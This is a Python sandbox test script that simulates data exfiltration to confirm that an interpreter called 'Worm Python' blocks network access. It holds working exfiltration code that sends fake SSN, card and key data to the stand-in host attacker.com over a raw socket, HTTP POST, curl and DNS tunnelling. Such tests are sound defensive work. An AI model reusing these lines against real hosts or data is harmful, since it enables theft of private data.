#!/usr/bin/env python3
"""
ATTACK SIMULATION: Network Data Exfiltration

This script simulates a malicious attempt to exfiltrate data over the network.
When run in Worm Python, ALL network operations will be blocked.

DEFENSIVE USE ONLY: This demonstrates what Worm Python prevents.
"""

import sys

def attempt_socket_exfiltration():
    """Attempt to exfiltrate data via raw socket."""
    sys.stdout.write("ATTACK: Attempting socket data exfiltration...\n")

    try:
        import socket

        # Try to create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('attacker.com', 1337))
        s.send(b'STOLEN_DATA: SSN=123-45-6789')
        s.close()

        sys.stdout.write("  ✗ BREACH: Data exfiltrated via socket!\n")
        return False

    except ImportError as e:
        sys.stdout.write(f"  ✓ BLOCKED: {str(e)[:60]}...\n")
        return True


def attempt_http_exfiltration():
    """Attempt to exfiltrate data via HTTP."""
    sys.stdout.write("\nATTACK: Attempting HTTP data exfiltration...\n")

    try:
        import urllib.request

        # Try to send data via HTTP
        data = b'STOLEN_DATA: Credit_Card=4532-1234-5678-9010'
        urllib.request.urlopen('http://attacker.com/exfil', data=data)

        sys.stdout.write("  ✗ BREACH: Data exfiltrated via HTTP!\n")
        return False

    except ImportError as e:
        sys.stdout.write(f"  ✓ BLOCKED: {str(e)[:60]}...\n")
        return True


def attempt_subprocess_exfiltration():
    """Attempt to exfiltrate data via curl subprocess."""
    sys.stdout.write("\nATTACK: Attempting curl subprocess exfiltration...\n")

    try:
        import subprocess

        # Try to use curl to send data
        subprocess.run([
            'curl', '-X', 'POST',
            '--data', 'STOLEN_DATA=PII_Records',
            'http://attacker.com/collect'
        ])

        sys.stdout.write("  ✗ BREACH: Data exfiltrated via curl!\n")
        return False

    except Exception as e:
        sys.stdout.write(f"  ✓ BLOCKED: {str(e)[:60]}...\n")
        return True


def attempt_dns_tunneling():
    """Attempt DNS tunneling for data exfiltration."""
    sys.stdout.write("\nATTACK: Attempting DNS tunneling exfiltration...\n")

    try:
        import socket

        # Try to exfiltrate data via DNS queries
        data = "secret_key_12345"
        hostname = f"{data}.attacker.com"
        socket.gethostbyname(hostname)

        sys.stdout.write("  ✗ BREACH: Data exfiltrated via DNS!\n")
        return False

    except ImportError as e:
        sys.stdout.write(f"  ✓ BLOCKED: {str(e)[:60]}...\n")
        return True


def main():
    sys.stdout.write("=" * 70 + "\n")
    sys.stdout.write("ATTACK SIMULATION: Network Data Exfiltration\n")
    sys.stdout.write("=" * 70 + "\n\n")

    sys.stdout.write("Simulating various network exfiltration techniques...\n")
    sys.stdout.write("In Worm Python, ALL these attacks are blocked.\n\n")

    results = []
    results.append(attempt_socket_exfiltration())
    results.append(attempt_http_exfiltration())
    results.append(attempt_subprocess_exfiltration())
    results.append(attempt_dns_tunneling())

    sys.stdout.write("\n" + "=" * 70 + "\n")
    sys.stdout.write(f"RESULT: {sum(results)}/{len(results)} attacks blocked\n")

    if all(results):
        sys.stdout.write("✓ SECURE: All exfiltration attempts prevented\n")
    else:
        sys.stdout.write("✗ VULNERABLE: Some attacks succeeded!\n")

    sys.stdout.write("=" * 70 + "\n")


if __name__ == '__main__':
    main()
